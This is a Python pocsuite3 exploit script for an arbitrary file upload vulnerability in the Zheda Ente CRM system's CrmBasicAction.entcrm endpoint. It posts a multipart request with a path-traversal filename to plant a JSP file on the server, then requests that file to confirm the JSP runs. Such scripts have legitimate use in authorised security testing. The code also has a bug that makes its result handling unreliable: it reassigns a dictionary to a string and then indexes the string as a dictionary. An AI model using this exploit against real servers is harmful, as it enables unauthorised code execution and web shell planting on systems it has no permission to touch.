# _*_ coding:utf-8 _*_
# @Time : 2024/1/16
# @Author: 炼金术师诸葛亮
import json
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class jinhe_jc6_upload(POCBase):
    pocDesc = '''浙大恩特客户资源管理系统CrmBasicAction.entcrm接口任意文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-16'
    name = '浙大恩特客户资源管理系统CrmBasicAction.entcrm接口任意文件上传漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old'

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            "Content-Type": "multipart/form-data; boundary=6760efb7cf7b276026b96389d0611d4c"
        }

        try:
            data = '--6760efb7cf7b276026b96389d0611d4c\r\nContent-Disposition: form-data; name="file"; filename="../../954917.jsp"\r\nContent-Type: application/zip\r\n\r\n<% out.println("517870535"); %>\r\n--6760efb7cf7b276026b96389d0611d4c--'

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and 'name' in response.text:
                rtext=response.text
                json_data = json.loads(rtext)
                c_path_content = json_data['c_path']
                start_index = c_path_content.find("Entsoft/enterdoc.war/dao//") + len("Entsoft/enterdoc.war/dao//")
                end_index = c_path_content.rfind("/")
                result = c_path_content[start_index:end_index]
                if result:
                    r = requests.get(self.url+result+'/954917.jsp')
                    if r.status_code == 200 and '517870535' in r.text:
                        result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(jinhe_jc6_upload)